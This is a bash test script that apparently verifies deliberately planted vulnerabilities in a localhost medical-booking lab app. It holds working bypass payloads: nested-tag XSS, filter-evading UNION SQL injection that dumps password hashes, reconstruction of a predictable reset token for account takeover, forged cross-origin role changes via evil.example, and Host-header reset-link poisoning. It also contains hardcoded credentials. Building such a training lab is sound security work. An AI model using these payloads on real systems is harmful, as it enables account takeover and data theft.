#!/usr/bin/env bash
# Task 5 verification: Medium vulns #7,#8,#10,#11,#12,#14.
# Per vuln: obvious payload BLOCKED, intended bypass WORKS. Run against the live stack.
set -u
BASE="http://localhost:8080"
MINIO="http://localhost:9000"
BUCKET="medislot-attachments"
MAILHOG="http://localhost:8025"
SALT="medislot-static-salt-2024"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
fails=0
pass() { echo "  PASS: $1"; }
fail() { echo "  FAIL: $1"; fails=$((fails+1)); }
winpath() { command -v cygpath >/dev/null 2>&1 && cygpath -w "$1" || printf '%s' "$1"; }
md5h() { printf '%s' "$1" | md5sum | cut -d' ' -f1; }
sqlq() { docker compose exec -T mysql mysql -N -umedislot -pmedislot123 medislot -e "$1" 2>/dev/null | tr -d '\r'; }
login() { curl -s -c "$1" -b "$1" -o /dev/null "$BASE/login.php"
          curl -s -c "$1" -b "$1" -o /dev/null --data-urlencode "email=$2" --data-urlencode "password=$3" "$BASE/login.php"; }
refloc() { sed -n 's/.*ref=\([A-Za-z0-9_-]*\).*/\1/p' | head -1; }

UID8=$(sqlq "SELECT id FROM users WHERE email='pacjent8@novamed.lab';")
UID7=$(sqlq "SELECT id FROM users WHERE email='pacjent7@novamed.lab';")

DJAR="$TMP/d.jar"; login "$DJAR" "lekarz1@novamed.lab" "Doctor123!"
AJAR="$TMP/a.jar"; login "$AJAR" "admin@novamed.lab" "Admin123!"
RJAR="$TMP/r.jar"; login "$RJAR" "recepcja@novamed.lab" "Reception123!"
PJAR="$TMP/p.jar"; login "$PJAR" "pacjent1@novamed.lab" "Patient123!"

echo "== #7 stored XSS in doctor note (naive single-pass blacklist) =="
pid=$(curl -s -b "$DJAR" "$BASE/note.php" | grep -o 'value="[0-9]*"' | head -1 | grep -o '[0-9]*')
# (a) obvious: <script>alert(1)</script> -> "script" stripped, inert.
ref=$(curl -s -b "$DJAR" -D - -o /dev/null --data-urlencode "patient_id=$pid" \
  --data-urlencode 'body_html=<script>alert(1)</script>' "$BASE/note.php" | grep -i '^location' | refloc)
out=$(curl -s -b "$AJAR" "$BASE/note_view.php?ref=$ref")
echo "$out" | grep -q '<script' && fail "obvious <script> survived filter" || pass "obvious <script>alert(1) neutralized"
# (b) bypass: keyword re-forms after one removal.
ref=$(curl -s -b "$DJAR" -D - -o /dev/null --data-urlencode "patient_id=$pid" \
  --data-urlencode 'body_html=<scrscriptipt>alert(7)</scrscriptipt>' "$BASE/note.php" | grep -i '^location' | refloc)
out=$(curl -s -b "$AJAR" "$BASE/note_view.php?ref=$ref")
echo "$out" | grep -q '<script>alert(7)</script>' \
  && pass "nested-tag bypass stored raw, fires in admin's session" || fail "nested-tag XSS bypass did not reform"

echo "== #8 predictable, reusable password-reset token =="
tok=$(md5h "${UID8}${SALT}")
inv=$(curl -s "$BASE/reset.php?u=$UID8&token=$tok")
echo "$inv" | grep -q 'Invalid reset link' && fail "reconstructed token rejected" \
  || pass "token md5(uid.salt) reconstructed offline and accepted"
curl -s -o /dev/null --data-urlencode "u=$UID8" --data-urlencode "token=$tok" --data-urlencode "password=Pwned123!" "$BASE/reset.php"
TJ="$TMP/t.jar"; login "$TJ" "pacjent8@novamed.lab" "Pwned123!"
badge=$(curl -s -b "$TJ" "$BASE/dashboard.php" | grep -o 'badge-[a-z]*' | head -1)
[ "$badge" = "badge-patient" ] && pass "account takeover: logged in with attacker-set password" || fail "takeover login failed ($badge)"
curl -s -o /dev/null --data-urlencode "u=$UID8" --data-urlencode "token=$tok" --data-urlencode "password=Pwned456!" "$BASE/reset.php"
inv2=$(curl -s "$BASE/reset.php?u=$UID8&token=$tok")
echo "$inv2" | grep -q 'Invalid reset link' && fail "token consumed (not reusable)" || pass "token reusable (no expiry/consumption)"
sqlq "UPDATE users SET password_hash='$(md5h 'Patient890!')' WHERE id=$UID8;"  # restore

echo "== #10 SQL injection in search.php (numeric concat) =="
ob=$(curl -s -b "$RJAR" --get --data-urlencode "min_id=' OR 1=1" "$BASE/search.php")
echo "$ob" | grep -qiE '[0-9a-f]{32}' && fail "obvious ' OR 1=1 leaked a hash" || pass "obvious ' OR 1=1 blocked (no hash dumped)"
inj="0/**/UNIUNIONON/**/SELECT/**/email,password_hash,role,full_name/**/FROM/**/users"
by=$(curl -s -b "$RJAR" --get --data-urlencode "min_id=$inj" "$BASE/search.php")
echo "$by" | grep -qi '2637a5c30af69a7bad877fdb65fbd78b' \
  && pass "/**/ + UNIUNIONON bypass dumped password_hash column" || fail "UNION bypass did not dump hashes"

echo "== #11 MinIO public bucket, guessable key, unauthenticated fetch =="
printf 'GIF89a;unit-test' > "$TMP/pic.gif"
r=$(curl -s -b "$PJAR" -F "file=@$(winpath "$TMP/pic.gif");type=image/gif" "$BASE/upload.php")
key=$(echo "$r" | grep -o 'att-[0-9]*-pic\.gif' | head -1)
if [ -n "$key" ]; then
  code=$(curl -s -o "$TMP/anon" -w '%{http_code}' "$MINIO/$BUCKET/$key")
  { [ "$code" = "200" ] && grep -q "unit-test" "$TMP/anon"; } \
    && pass "anonymous fetched $key from public bucket" || fail "object not anon-readable ($code)"
else
  fail "upload produced no key"
fi

echo "== #12 CSRF: no token / no Origin check on state change =="
before=$(sqlq "SELECT role FROM users WHERE id=$UID7;")
curl -s -b "$AJAR" -o /dev/null -H "Origin: http://evil.example" -H "Referer: http://evil.example/" \
  --data-urlencode "id=$UID7" --data-urlencode "role=doctor" "$BASE/admin_role.php"
after=$(sqlq "SELECT role FROM users WHERE id=$UID7;")
[ "$after" = "doctor" ] && pass "forged cross-origin no-token POST changed role ($before -> $after)" \
  || fail "CSRF role change failed ($before -> $after)"
sqlq "UPDATE users SET role='patient' WHERE id=$UID7;"  # restore

echo "== #14 reset link host taken from Host header =="
curl -s -o /dev/null -H "Host: evil.example" --data-urlencode "email=pacjent1@novamed.lab" "$BASE/reset_request.php"
msg=$(curl -s "$MAILHOG/api/v2/messages?limit=5")
echo "$msg" | grep -q 'evil.example' && pass "tampered Host produced attacker-domain reset link" || fail "Host tamper not reflected in email"

echo
if [ "$fails" -eq 0 ]; then echo "ALL TASK 5 CHECKS PASSED"; else echo "$fails CHECK(S) FAILED"; fi
exit "$fails"
